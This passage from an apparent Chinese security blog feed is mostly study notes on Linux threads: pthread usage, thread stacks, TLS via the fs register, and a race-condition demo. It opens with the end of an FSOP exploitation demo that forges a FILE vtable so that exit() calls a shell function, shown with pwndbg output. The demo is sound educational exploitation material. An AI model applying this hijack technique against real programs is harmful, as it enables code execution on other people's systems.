class="number">0x100</span>);</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span>*)((<span class="type">long</span> <span class="type">long</span>)ptr+<span class="number">0x100</span>+<span class="number">24</span>)=sh;</span><br><span class="line"></span><br><span class="line">    list_all_ptr=(<span class="type">long</span> <span class="type">long</span> *)_IO_list_all;</span><br><span class="line"></span><br><span class="line">    list_all_ptr[<span class="number">0</span>]=ptr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p _IO_list_all</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = (struct _IO_FILE_plus *) 0x602010</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p *(struct _IO_FILE_plus *) 0x602010</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = &#123;</span></span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 0, </span><br><span class="line">    _IO_read_ptr = 0x0, </span><br><span class="line">    _IO_read_end = 0x0, </span><br><span class="line">    _IO_read_base = 0x0, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x1 &lt;error: Cannot access memory at address 0x1&gt;, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x0, </span><br><span class="line">    _offset = 0, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x0, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = 0, </span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x602110</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p *(struct _IO_jump_t*)0x602110</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3 = &#123;</span></span><br><span class="line">  __dummy = 0, </span><br><span class="line">  __dummy2 = 0, </span><br><span class="line">  __finish = 0x0, </span><br><span class="line">  __overflow = 0x4005b6 &lt;sh&gt;, </span><br><span class="line">  __underflow = 0x0, </span><br><span class="line">  __uflow = 0x0, </span><br><span class="line">  __pbackfail = 0x0, </span><br><span class="line">  __xsputn = 0x0, </span><br><span class="line">  __xsgetn = 0x0, </span><br><span class="line">  __seekoff = 0x0, </span><br><span class="line">  __seekpos = 0x0, </span><br><span class="line">  __setbuf = 0x0, </span><br><span class="line">  __sync = 0x0, </span><br><span class="line">  __doallocate = 0x0, </span><br><span class="line">  __read = 0x0, </span><br><span class="line">  __write = 0x0, </span><br><span class="line">  __seek = 0x0, </span><br><span class="line">  __close = 0x0, </span><br><span class="line">  __stat = 0x0, </span><br><span class="line">  __showmanyc = 0x0, </span><br><span class="line">  __imbue = 0x0</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p sh</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">4 = &#123;void ()&#125; 0x4005b6 &lt;sh&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2023/04/06/FSOP/image-20230406132711374.png" alt="image-20230406132711374"></p><p><img src="/2023/04/06/FSOP/image-20230406132733192.png" alt="image-20230406132733192"></p>]]></content>
      
      
      
        <tags>
            
            <tag> FSOP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NJUOS:多处理器编程</title>
      <link href="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/"/>
      <url>/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p><a href="http://jyywiki.cn/OS/2022/slides/3.slides#">http://jyywiki.cn/OS/2022/slides/3.slides#</a></p><h2 id="thread-h-简化的线程-API"><a href="#thread-h-简化的线程-API" class="headerlink" title="thread.h 简化的线程 API"></a><code>thread.h</code> 简化的线程 API</h2><p>进程是资源分配的基本单位，linux线程其实是通过轻量级进程实现的LWP(light weight process)，所有Linux内核的角度去看线程和进程并没有区别，只不过他和主线程共享一些资源，线程是最小的执行单位，调度的基本单位。同时也是资源竞争的基本单位。</p><p>具体的东西之前 <a href="https://grxer.github.io/2023/03/26/TLS-Hijack/">https://grxer.github.io/2023/03/26/TLS-Hijack/</a> 里有讨论</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdatomic.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NTHREAD 64</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> T_FREE = <span class="number">0</span>, T_LIVE, T_DEAD, &#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> id, status;</span><br><span class="line">  <span class="type">pthread_t</span> thread;</span><br><span class="line">  <span class="type">void</span> (*entry)(<span class="type">int</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread</span> <span class="title">tpool</span>[<span class="title">NTHREAD</span>], *<span class="title">tptr</span> =</span> tpool;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">wrapper</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">thread</span> =</span> (<span class="keyword">struct</span> thread *)arg;</span><br><span class="line">  thread-&gt;entry(thread-&gt;id);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create</span><span class="params">(<span class="type">void</span> *fn)</span> &#123;</span><br><span class="line">  assert(tptr - tpool &lt; NTHREAD);</span><br><span class="line">  *tptr = (<span class="keyword">struct</span> thread) &#123;</span><br><span class="line">    .id = tptr - tpool + <span class="number">1</span>,</span><br><span class="line">    .status = T_LIVE,</span><br><span class="line">    .entry = fn,</span><br><span class="line">  &#125;;</span><br><span class="line">  pthread_create(&amp;(tptr-&gt;thread), <span class="literal">NULL</span>, wrapper, tptr);</span><br><span class="line">  ++tptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">join</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NTHREAD; i++) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">t</span> =</span> &amp;tpool[i];</span><br><span class="line">    <span class="keyword">if</span> (t-&gt;status == T_LIVE) &#123;</span><br><span class="line">      pthread_join(t-&gt;thread, <span class="literal">NULL</span>);</span><br><span class="line">      t-&gt;status = T_DEAD;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((destructor)) <span class="type">void</span> <span class="title function_">cleanup</span><span class="params">()</span> &#123; </span><br><span class="line">  join();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>POSIX线程库进一步做了一层封装，做了个main函数的析构函数阻塞进程等待</p><blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_create</span><span class="params">(</span></span><br><span class="line"><span class="params">                 <span class="type">pthread_t</span> * tidp,   <span class="comment">//新创建的线程ID指向的内存单元。</span></span></span><br><span class="line"><span class="params">                 <span class="type">const</span> <span class="type">pthread_attr_t</span> * attr,  <span class="comment">//线程属性</span></span></span><br><span class="line"><span class="params">                 <span class="type">void</span> *(*start_rtn)(<span class="type">void</span> *), <span class="comment">//新创建的线程从start_rtn函数的地址开始运行,使用参数时我们通常会进行类型强转</span></span></span><br><span class="line"><span class="params">                 <span class="type">void</span> * arg <span class="comment">//若上述函数需要参数，将参数放入结构中并将地址作为arg传入。</span></span></span><br><span class="line"><span class="params">                  )</span>;<span class="comment">//创建成功返回0，否则返回错误信息对应的非0宏</span></span><br><span class="line"><span class="type">void</span>类型的指针配合上类型强转给了我们更多的灵活性和自由性</span><br><span class="line"><span class="type">pthread_t</span>类型的线程tibp，是进程内部，识别标志,两个进程间，这个线程ID允许相同</span><br><span class="line">pthread_create函数创建的线程默认非分离属性的，在非分离的情况下，当一个线程结束的时候，它所占用的系统资源并没有完全真正的释放，也没有真正终止。</span><br><span class="line">只有在pthread_join函数返回时，该线程才会释放自己的资源。或者是设置在分离属性的情况下，一个线程结束会立即释放它所占用的资源。</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_detach</span><span class="params">(<span class="type">pthread_t</span> tid)</span>;分离一个线程，一个分离的线程是不能被其他线程回收或杀死的。它的内存资源在它终止时由系统自动释放。</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_join</span><span class="params">(<span class="type">pthread_t</span> thread, <span class="comment">//指定等待哪个子线程结束，接收哪个线程的返回值，只能是非分离线程</span></span></span><br><span class="line"><span class="params">                 <span class="type">void</span> ** retval<span class="comment">//接收参数返回值</span></span></span><br><span class="line"><span class="params">                )</span>;<span class="comment">//成功返回0，否则返回错误信息对应的非0宏</span></span><br><span class="line">一直阻塞调用它的线程，直至目标线程执行结束（接收到目标线程的返回值），阻塞状态才会解除。</span><br><span class="line">如果一个线程是非分离的（默认情况下创建的线程都是非分离）并且没有对该线程使用 pthread_join() 的话，该线程结束后并不会释放其内存(系统)空间，这会导致该线程变成了“僵尸线程”。join后我们也必须手动清除程序分配的空间(堆等等)</span><br></pre></td></tr></table></figure></blockquote></li><li><p>_attribute__关键字主要是用来在函数或数据声明中设置其属性。给函数赋给属性的主要目的在于让编译器进行优化。</p></li><li><p>使用编译时pthread 库需要加上-lpthread，因为pthread并非Linux系统的默认库</p><blockquote><p>-lpthread 选项只是告诉编译器在链接时链接 pthread 库。</p><p>-pthread 将自动添加必要的编译选项和链接选项，以确保程序正确地使用 pthread 库,编译器会自动将 “-lpthread” 选项添加到链接命令行中，以确保在链接时链接 pthread 库。</p></blockquote></li></ul><h3 id="创建线程使用的是哪个系统调用？"><a href="#创建线程使用的是哪个系统调用？" class="headerlink" title="创建线程使用的是哪个系统调用？"></a>创建线程使用的是哪个系统调用？</h3><p>strace了一下</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mmap(NULL, 8392704, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0) = 0x7ffff73ff000</span><br><span class="line">mprotect(0x7ffff7400000, 8388608, PROT_READ|PROT_WRITE) = 0</span><br><span class="line">getrandom(&quot;\x5c\xf7\x7d\x5a\x8a\x60\xbd\x73&quot;, 8, GRND_NONBLOCK) = 8</span><br><span class="line">brk(NULL)                               = 0x555555559000</span><br><span class="line">brk(0x55555557a000)                     = 0x55555557a000</span><br><span class="line">rt_sigprocmask(SIG_BLOCK, ~[], [], 8)   = 0</span><br><span class="line">clone3(&#123;flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, child_tid=0x7ffff7bff910, parent_tid=0x7ffff7bff910, exit_signal=0, stack=0x7ffff73ff000, stack_size=0x7fff00, tls=0x7ffff7bff640&#125;gr</span><br><span class="line"> =&gt; &#123;parent_tid=[8670]&#125;, 88) = 8670</span><br></pre></td></tr></table></figure><p>gdb跟了一下，最后系统调用函数clong3进内核syscall的时候是一个很奇怪未知的调用号</p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404215319891.png" alt="image-20230404215319891"></p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404215306823.png" alt="image-20230404215306823"></p><h3 id="gdb调试多线程"><a href="#gdb调试多线程" class="headerlink" title="gdb调试多线程"></a>gdb调试多线程</h3><p><a href="https://sourceware.org/gdb/onlinedocs/gdb/Threads.html">https://sourceware.org/gdb/onlinedocs/gdb/Threads.html</a></p><h2 id="线程独立的栈区"><a href="#线程独立的栈区" class="headerlink" title="线程独立的栈区"></a>线程独立的栈区</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;thread.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">__thread <span class="type">char</span> *base, *cur; <span class="comment">// thread-local variables</span></span><br><span class="line">__thread <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line"><span class="comment">// objdump to see how thread-local variables are implemented</span></span><br><span class="line">__attribute__((noinline)) <span class="type">void</span> <span class="title function_">set_cur</span><span class="params">(<span class="type">void</span> *ptr)</span> &#123; cur = ptr; &#125;</span><br><span class="line">__attribute__((noinline)) <span class="type">char</span> *<span class="title function_">get_cur</span><span class="params">()</span>         &#123; <span class="keyword">return</span> cur; &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">stackoverflow</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">  set_cur(&amp;n);</span><br><span class="line">  <span class="keyword">if</span> (n % <span class="number">1024</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="type">int</span> sz = base - get_cur();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack size of T%d &gt;= %d KB\n&quot;</span>, id, sz / <span class="number">1024</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  stackoverflow(n + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Tprobe</span><span class="params">(<span class="type">int</span> tid)</span> &#123;</span><br><span class="line">  id = tid;</span><br><span class="line">  base = (<span class="type">void</span> *)&amp;tid;</span><br><span class="line">  stackoverflow(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    create(Tprobe);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>把输出缓冲区关了，起了四个线程，每个线程都会Tprobe作为入口点，tid在相对高地址栈上，把栈地址给了base，调用StackOverflow</p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404185540104.png" alt="image-20230404185540104"></p><p>n始终在在栈rbp-0x24偏移处，最后会递归自己，每1024次会计算一次n距离栈底的距离，没有终止条件，栈一直在栈，始终有一天会真正的stackoverflow，我们就可以估计栈的大小</p><p>我们可以通过pipe 把结果给sort排序</p><p><code>./stack-probe | sort -nk 6</code></p><ul><li>-k选择一列</li><li>-n把某一列当作数字排序</li></ul><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404195902138.png" alt="image-20230404195902138"></p><p>猜测出栈的大小默认也就是8M</p><h3 id="线程内存模型"><a href="#线程内存模型" class="headerlink" title="线程内存模型"></a>线程内存模型</h3><p>一组并发线程运行在一个进程的上下文中,各自独立的线程栈的内存模型不是那么整齐清楚的。栈被保存在虚拟地址空间的栈区域中,线程栈是不对其他线程设防的，所以如果一个线程得到另一个线程的栈指针，也是可以进行访问修改</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">show</span><span class="params">(<span class="type">void</span>* ptr)</span> &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, <span class="string">&quot;grxer&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;grxer&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">10</span>] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, name);</span><br><span class="line">    <span class="type">pthread_t</span> id;</span><br><span class="line">    pthread_create(&amp;id, <span class="literal">NULL</span>, show,(<span class="type">void</span>*) name);</span><br><span class="line">    pthread_join(id, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  %s&quot;</span>, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/N/p3&gt; gcc -g -o  test test.c -pthread</span><br><span class="line">grxer@grxer ~/D/s/N/p3&gt; ./test</span><br><span class="line">hello  grxer⏎    </span><br></pre></td></tr></table></figure><h3 id="如何改变这个堆栈大小"><a href="#如何改变这个堆栈大小" class="headerlink" title="如何改变这个堆栈大小?"></a>如何改变这个堆栈大小?</h3><blockquote><p>可以利用pthread_create第二个参数线程属性在创建线程时做操作</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Data structure for condition variable handling.  The structure of</span></span><br><span class="line"><span class="comment">   the attribute type is not exposed on purpose.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> __size[__SIZEOF_PTHREAD_CONDATTR_T];</span><br><span class="line">  <span class="type">int</span> __align;</span><br><span class="line">&#125; <span class="type">pthread_condattr_t</span>;</span><br></pre></td></tr></table></figure><p>没有公开类型，但是给我们了api</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pthread_attr_init</span><span class="params">(<span class="type">pthread_attr_t</span> *attr)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_attr_getstacksize</span><span class="params">(<span class="type">pthread_attr_t</span> *attr, <span class="type">size_t</span> *stacksize)</span>; </span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_attr_setstacksize</span><span class="params">(<span class="type">pthread_attr_t</span> *attr, <span class="type">size_t</span> stacksize)</span>;</span><br><span class="line">返回值<span class="number">0</span>，<span class="number">-1</span>分别表示成功与失败，这里的stacksize都是以byte为单位</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pthread_t</span> id;</span><br><span class="line">    <span class="type">pthread_attr_t</span> thread_attr;</span><br><span class="line">    <span class="type">size_t</span> stacksize;</span><br><span class="line">    <span class="type">int</span> res = pthread_attr_init(&amp;thread_attr);</span><br><span class="line">    assert(!res);</span><br><span class="line">    res = pthread_attr_getstacksize(&amp;thread_attr, &amp;stacksize);</span><br><span class="line">    assert(!res);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;before:%zu\n&quot;</span>, stacksize);</span><br><span class="line">    res = pthread_attr_setstacksize(&amp;thread_attr,<span class="number">10485760</span>);</span><br><span class="line">    assert(!res);</span><br><span class="line">    res = pthread_attr_getstacksize(&amp;thread_attr, &amp;stacksize);</span><br><span class="line">    assert(!res);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;after:%zu\n&quot;</span>, stacksize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">grxer@grxer ~/D/s/N/p3&gt; ./test</span><br><span class="line">before:<span class="number">8388608</span></span><br><span class="line">after:<span class="number">10485760</span></span><br></pre></td></tr></table></figure><p>我们这样去改造一下<code>thread.h</code>就好</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">pthread_attr_t</span> thread_attr;</span><br><span class="line"> <span class="type">int</span> res = pthread_attr_init(&amp;thread_attr);</span><br><span class="line"> assert(!res);</span><br><span class="line"> res = pthread_attr_setstacksize(&amp;thread_attr, <span class="number">10485760</span>);</span><br><span class="line"> assert(!res);</span><br><span class="line"> pthread_create(&amp;(tptr-&gt;thread), &amp;thread_attr, wrapper, tptr);</span><br></pre></td></tr></table></figure><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404203402253.png" alt="image-20230404203402253"></p></blockquote><h3 id="thread浅谈"><a href="#thread浅谈" class="headerlink" title="__thread浅谈"></a>__thread浅谈</h3><p><strong>Thread Local Storage</strong>，之前劫持过tls来bypass canary，但是对底层理解并不深，这次有了新的体会，但是也只是浅谈，好多东西还没搞懂，要去补补保护模式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get_cur</span><br><span class="line">.text:0000000000001388 55                            push    rbp</span><br><span class="line">.text:0000000000001389 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:000000000000138C 64 48 8B 04 25 F0 FF FF FF    mov     rax, fs:0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:0000000000001395 5D                            pop     rbp</span><br></pre></td></tr></table></figure><p>还是和fs段寄存器有关，其实准确来说，自从8086的实模式过后，cs ss ds es等段寄存器里面存的不再是为了满足20位地址总线和重定位的物理段基地址，在保护模式下变为了段选择字，现在更应该叫段选择器，保护模式下会有用户态不可见的部分，叫做描述符高速缓冲器(是一个缓存，每次进行段解析后保存再里面)，由处理器自动使用，而真正的段地址就在这里面</p><p><strong>有以下方式去获得fs段地址</strong></p><p>&gt;&gt;&gt;通过内联汇编的方式</p><p>&gt;&gt;&gt;<a href="https://www.onitroad.com/jc/linux/man-pages/linux/man2/arch_prctl.2.html">系统调用int arch_prctl(int code, unsigned long *addr)</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> fs_value;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> fs_value2;</span><br><span class="line">    <span class="type">pthread_t</span> pid = pthread_self();</span><br><span class="line">    <span class="type">int</span> ret = arch_prctl(ARCH_GET_FS,&amp;fs_value2); </span><br><span class="line">    __asm__ <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;mov %%fs:0, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (fs_value))</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;FS寄存器的值为: 0x%lx\narch_prctl:0x%lx\npid:0x%lx&quot;</span>, fs_value,fs_value2,pid);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">grxer@grxer ~/D/s/N/ctest&gt; ./test</span><br><span class="line">FS寄存器的值为: <span class="number">0x7ffff7fa6740</span></span><br><span class="line">arch_prctl:<span class="number">0x7ffff7fa6740</span></span><br><span class="line">pid:<span class="number">0x7ffff7fa6740</span>⏎   </span><br></pre></td></tr></table></figure><p>&gt;&gt;&gt;gdb的<code>fsbase命令</code>或<code>p/x pthread_self()</code>获得这个值</p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404205339561.png" alt="image-20230404205339561"></p><p>这里才惊奇的发现gdb里可以直接运行c函数</p><p>可以看到POSIX线程库的pthread_create返回给我们的tidp是每个线程的fs段地址</p><p>观察一下程序里定义的__thread变量和汇编里的关系</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__thread <span class="type">char</span> *base, *cur; <span class="comment">// thread-local variables</span></span><br><span class="line">__thread <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line">base:.text:<span class="number">0000000000001435</span> <span class="number">64</span> <span class="number">89</span> <span class="number">04</span> <span class="number">25</span> F8 FF FF FF       mov     fs:<span class="number">0F</span>FFFFFFFFFFFFFF8h(<span class="number">-8</span>), eax</span><br><span class="line">cur：.text:<span class="number">000000000000138</span>C <span class="number">64</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">04</span> <span class="number">25</span> F0 FF FF FF    mov     rax, fs:<span class="number">0F</span>FFFFFFFFFFFFFF0h(<span class="number">-16</span>)</span><br><span class="line">id：.text:<span class="number">0000000000001441</span> <span class="number">64</span> <span class="number">48</span> <span class="number">89</span> <span class="number">04</span> <span class="number">25</span> E8 FF FF FF    mov     fs:<span class="number">0F</span>FFFFFFFFFFFFFE8h(<span class="number">-24</span>), rax</span><br></pre></td></tr></table></figure><p>在fs-8处开始排列，他的下面也就是我们的之前看的canary和__exit_funcs析构函数组的key，pthread_create去创建一个进程是用mmap一块内存当作堆栈，fs则位于这个堆栈的高地址处，也就是堆栈的底部</p><h2 id="原子性的丧失"><a href="#原子性的丧失" class="headerlink" title="原子性的丧失"></a>原子性的丧失</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;thread.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100000000</span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Tsum</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">    sum++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  create(Tsum);</span><br><span class="line">  create(Tsum);</span><br><span class="line">  join();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;sum = %ld\n&quot;</span>, sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就连单处理器并发都得不到正确的结果。<code>taskset -c cpu-cpu &lt;command&gt;</code>限制在cpu-cpu个处理器上运行</p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404235118554.png" alt="image-20230404235118554"></p><p>多处理器线程在并行，偏差更大</p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404235238898.png" 